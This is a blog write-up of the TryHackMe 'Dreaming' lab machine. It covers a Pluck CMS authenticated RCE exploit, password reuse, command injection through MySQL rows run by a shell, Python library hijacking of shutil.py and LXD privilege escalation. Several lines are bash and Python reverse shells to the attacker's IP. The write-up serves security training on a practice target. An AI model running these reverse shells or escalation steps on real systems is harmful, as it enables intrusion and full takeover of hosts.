---
layout: post
title: Dreaming writeup (TryHackMe)
author: wizarddos
category: writeups
---

This is a fresh machine (while writing it was made today, I solved it 2 days after release, and I updated it 3 days after release)  

<!-- more -->

### Enumaration 
First thing we should do is nmap scan
```
$ nmap -sC -sV -oN scan.txt $IP
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-17 21:24 CET
Nmap scan report for 10.10.241.63
Host is up (0.059s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 76:26:67:a6:b0:08:0e:ed:34:58:5b:4e:77:45:92:57 (RSA)
|   256 52:3a:ad:26:7f:6e:3f:23:f9:e4:ef:e8:5a:c8:42:5c (ECDSA)
|_  256 71:df:6e:81:f0:80:79:71:a8:da:2e:1e:56:c4:de:bb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.82 seconds
```

There are only 2 services - there must be something on Apache

First thing we see is default apache page - maybe something is hidden
```
$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://$IP/  -x php,html,txt,js  
[...]
/app                  (Status: 301) [Size: 310] [--> http://10.10.241.63/app/]
/index.html           (Status: 200) [Size: 10918]
/index.html           (Status: 200) [Size: 10918]
/server-status        (Status: 403) [Size: 277]
Progress: 23075 / 23080 (99.98%)

```

The most important part must be hidden in `app`. Inside is another dir called `pluck-4.7.13`

This must be the name of service and it's verion - by the way
```
$ searchsploit pluck       
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
[...]
Pluck CMS 4.7.13 - File Upload Remote Code Execution (Authenticated)              | php/webapps/49909.py
Pluck CMS 4.7.16 - Remote Code Execution (RCE) (Authenticated)                    | php/webapps/50826.py
Pluck CMS 4.7.3 - Cross-Site Request Forgery (Add Page)                           | php/webapps/40566.py
Pluck CMS 4.7.3 - Multiple Vulnerabilities                                        | php/webapps/38002.txt
Pluck v4.7.18 - Remote Code Execution (RCE)                                       | php/webapps/51592.py
pluck v4.7.18 - Stored Cross-Site Scripting (XSS)                                 | php/webapps/51420.txt
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

We have a vulnerability -  RCE and Arbitrary File Upload. But authenticated so we will have to find a way to log in

Actually with a simple brute force I guessed the password - it's `password`

Now we can utilize our exploit - copy it to our working directory

```
$ searchsploit -m 49909 
```

After we analyze the code we see it takes 4 parameters
```
'''
User Input:
'''
target_ip = sys.argv[1]
target_port = sys.argv[2]
password = sys.argv[3]
pluckcmspath = sys.argv[4]
```

So our command looks like this

```
$ python3 49909.py $IP 80 "password" "/app/pluck-4.7.13"
```

After we visit a link on the website we get a beatiful shell - I like it tbh

### Escalation pt.1 - lucien

In `/opt` we have a file called `test.py`
```
$ cat test.py 
import requests

#Todo add myself as a user
url = "http://127.0.0.1/app/pluck-4.7.13/login.php"
password = "[REDACTED]"

data = {
        "cont1":password,
        "bogus":"",
        "submit":"Log+in"
        }

req = requests.post(url,data=data)

if "Password correct." in req.text:
    print("Everything is in proper order. Status Code: " + str(req.status_code))
else:
    print("Something is wrong. Status Code: " + str(req.status_code))
    print("Results:\n" + req.text)
```

It contains a password? Maybe `lucien` reuses his/her passwords?
```
su lucien
Password: [REDACTED]
lucien@dreaming:/opt$ 
```

Boom! - it worked.

Let's go to home dir and get first flag

```
$ cd ~
$ cat lucien_flag.txt
[REDACTED]
```

We have the first flag - now 2 are left

### Escalation pt.2 - Death


Maybe we can run somthing as other user?
```
$ sudo -l
Matching Defaults entries for lucien on dreaming:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lucien may run the following commands on dreaming:
    (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py

```

That's it -  we can execute `getDreams.py` as `death`. Sadly we can't read it, but wait

Check `/opt` dir again

```
$ ls -la
total 16
drwxr-xr-x  2 root   root   4096 Aug 15 12:45 .
drwxr-xr-x 20 root   root   4096 Jul 28 22:35 ..
-rwxrw-r--  1 death  death  1574 Aug 15 12:45 getDreams.py
-rwxr-xr-x  1 lucien lucien  483 Aug  7 23:36 test.py
```

We also have `getDreams.py` here, but readable - let's see it's content
```
$ cat getDreams.py
import mysql.connector
import subprocess

# MySQL credentials
DB_USER = "death"
DB_PASS = "#redacted"
DB_NAME = "library"

import mysql.connector
import subprocess

def getDreams():
    try:
        # Connect to the MySQL database
        connection = mysql.connector.connect(
            host="localhost",
            user=DB_USER,
            password=DB_PASS,
            database=DB_NAME
        )

        # Create a cursor object to execute SQL queries
        cursor = connection.cursor()

        # Construct the MySQL query to fetch dreamer and dream columns from dreams table
        query = "SELECT dreamer, dream FROM dreams;"

        # Execute the query
        cursor.execute(query)

        # Fetch all the dreamer and dream information
        dreams_info = cursor.fetchall()

        if not dreams_info:
            print("No dreams found in the database.")
        else:
            # Loop through the results and echo the information using subprocess
            for dream_info in dreams_info:
                dreamer, dream = dream_info
                command = f"echo {dreamer} + {dream}"
                shell = subprocess.check_output(command, text=True, shell=True)
                print(shell)

    except mysql.connector.Error as error:
        # Handle any errors that might occur during the database connection or query execution
        print(f"Error: {error}")

    finally:
        # Close the cursor and connection
        cursor.close()
        connection.close()

# Call the function to echo the dreamer and dream information
getDreams()
```

My first idea is to hijack either `subprocess` or `mysql.connector` module - but I can't find any way to do this, so let's try with `mysql`

Our `.bash_history` has something interesting in it
```
$ cat .bash_history
[...]
clear
ls
mysql -u lucien -p[REDACTED]
ls -la
cat .bash_history 
cat .mysql_history 
```

In bash history we've found a password!

Let's log in now
```
$ mysql -u lucien -p
Enter password: [REDACTED]
[...]

mysql> 
```

We got it - use `library`
```
> use library;
```

If we edit something in this database we will get it printed - we can use this for `command injection` attack

Let's check it first - run this SQL query
```
INSERT INTO `dreams` VALUES("hacker", "yes | ls -la");
```

Then after we execute that code we get
```
$ sudo -u death /usr/bin/python3 /home/death/getDreams.py
Alice + Flying in the sky

Bob + Exploring ancient ruins

Carol + Becoming a successful entrepreneur

Dave + Becoming a professional musician

total 44
drwxr-xr-x 5 lucien lucien 4096 Nov 17 23:08 .
drwxr-xr-x 5 root   root   4096 Jul 28 22:26 ..
-rw------- 1 lucien lucien  684 Aug 25 16:27 .bash_history
-rw-r--r-- 1 lucien lucien  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 lucien lucien 3771 Feb 25  2020 .bashrc
drwx------ 3 lucien lucien 4096 Jul 28 18:42 .cache
drwxrwxr-x 4 lucien lucien 4096 Jul 28 18:42 .local
-rw-rw---- 1 lucien lucien   19 Jul 28 16:27 lucien_flag.txt
-rw------- 1 lucien lucien 3065 Nov 17 23:08 .mysql_history
-rw-r--r-- 1 lucien lucien  807 Feb 25  2020 .profile
drwx------ 2 lucien lucien 4096 Jul 28 14:25 .ssh
-rw-r--r-- 1 lucien lucien    0 Jul 28 14:28 .sudo_as_admin_successful

```

That's what we wanted - update that but with reverse shell

```
UPDATE dreams SET `dream` = "yes | /bin/bash -c 'bash -i 1>& /dev/tcp/[Your IP]/2137 0>&1'" WHERE dreamer = "hacker";
```

Set up a netcat listener in another tab and run that code

```
# on Kali/Parrot or any other machine u use
$ nc -lvnp 2137

# on attacked machine
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```

Then in another tab we get the shell -> upgrade it
```
$ python3 -c 'import pty; pty.spawn("/bin/bash");
```

We can get the flag now
```
$ cd ~
$ cat death_flag.txt
cat death_flag.txt
[REDACTED]
```

Second flag is here - now last one

`Death`'s password can be found it in `getDreams.py`

### Escalation pt.3 - Morpheus, intended path

Get to morpheus' home dir and list it
```
$ cd /home/morpheus
$ ls -la
total 44
drwxr-xr-x 3 morpheus morpheus 4096 Aug  7 23:48 .
drwxr-xr-x 5 root     root     4096 Jul 28 22:26 ..
-rw------- 1 morpheus morpheus   58 Aug 14 18:16 .bash_history
-rw-r--r-- 1 morpheus morpheus  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 morpheus morpheus 3771 Feb 25  2020 .bashrc
-rw-rw-r-- 1 morpheus morpheus   22 Jul 28 22:37 kingdom
drwxrwxr-x 3 morpheus morpheus 4096 Jul 28 22:30 .local
-rw-rw---- 1 morpheus morpheus   28 Jul 28 22:29 morpheus_flag.txt
-rw-r--r-- 1 morpheus morpheus  807 Feb 25  2020 .profile
-rw-rw-r-- 1 morpheus morpheus  180 Aug  7 23:48 restore.py
-rw-rw-r-- 1 morpheus morpheus   66 Jul 28 22:33 .selected_editor

```

There is a file called `restore.py` - let's check it
```
$ cat restore.py
from shutil import copy2 as backup

src_file = "/home/morpheus/kingdom"
dst_file = "/kingdom_backup/kingdom"

backup(src_file, dst_file)
print("The kingdom backup has been done!")

```

There is one interesting thing - `shutil`. Maybe we can do something with it. Let's search for it
```
$ find / -name shutil*  2>>/dev/null
/usr/lib/python3.8/shutil.py
/usr/lib/python3.8/__pycache__/shutil.cpython-38.pyc
/usr/lib/byobu/include/shutil
[...]
$ ls -l /usr/lib/python3.8/shutil.py
-rw-rw-r-- 1 root death 51474 Aug  7 23:52 /usr/lib/python3.8/shutil.py
```

Wait, we can read and write to it - Let's put reverse shell here

But first - start netcat listener on your machine
```
$ nc -lvnp 2137
```

Then, we need to open this file in some editor and replace it's content with reverse shell
```
$ nano /usr/lib/python3.8/shutil.py

# And inside:
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR IP",2137));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

Of course relpace `YOUR IP` with your actual ip from tryhackme VPN

Then we can save and exit it

After a while we  get shell - who are we?

```
$ whoami
morpheus
```

We are in his `home` dir (You can check it with `pwd`) - let's grab the flag
```
$ cat morpheus_flag.txt
[REDACTED]
```

And that's it, machine pwned - if you want to read about patched unintended path of privesc - Sure go ahead. You might learn something

### Escalation pt.3 - Morpheus the unintended path

Note: This is unintended path and has been patched (It worked for 2 days)
But I leave it here as relict and for you to learn another privesc technique

It doesn't work, because `lucien` is not the part of `lxd` group



To escalate to morpheus I went back to `lucien` user

```
$ su lucien
```
He is a part of `lxd` group - we can use lxd to [Escalate Privileges](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation#method-2)

I used method linked above

So, first on our machine (kali/parrot/attackbox) we clone `lxd-alpine-builder` and go into that directory
```
$ git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
```

Then, build the image
```
$ sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
$ sudo ./build-alpine -a i686
```

We need to move it to attacked machine - I use python web server

```
$ cd ../
$ python3 -m http.server 8000
```

Then, on attacked machine go to home dir and clone whole content of `lxd-alpine-builder` directory from attacking machine
```
$ wget -m http://[Your THM IP]:8000/lxd-alpine-builder
```

Go into directory signed with your ip and then to `lxd-alpine-builder` and import image
```
$ lxc image import ./alpine*.tar.gz --alias myimage
```

Initialize `lxd`
```
$ lxd init
```

And create container from image with `security.privileged` option
```
$ lxc init myimage mycontainer -c security.privileged=true
```

Then, mount `/` dir of attacked machine into `lxd` container
```
$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```

And last - start the container and shell to it
```
$ lxc start mycontainer
$ lxc exec mycontainer /bin/sh
```

Now we are root in `lxd` container - go to `/mnt/root`
```
# cd /mnt/root
```

And there we have it - the `/` directory of machine - get `/home/morpheus/morpheus_flag.txt` flag
```
# cat home/morpheus/morpheus_flag.txt
[REDACTED]
```

And that's it - machine pwned

## Conclusion

Solvning this machine was really fun - I've got pretty quickly through initial access and escalating to `death` was also a piece of cake for me. But with `morpheus` I had big problem

I was thinking how to do it, and I found the way - I actually started liking escalating via `lxd`

I also liked the another one, but I am proud that I found the unintended way too

So, in there I've learned how te exploit `pluck` and practised my privilege escalation skills with files hidden in `/opt`, comand injection using data from `mysql` and `lxd`

That's it - see you in the next writeups
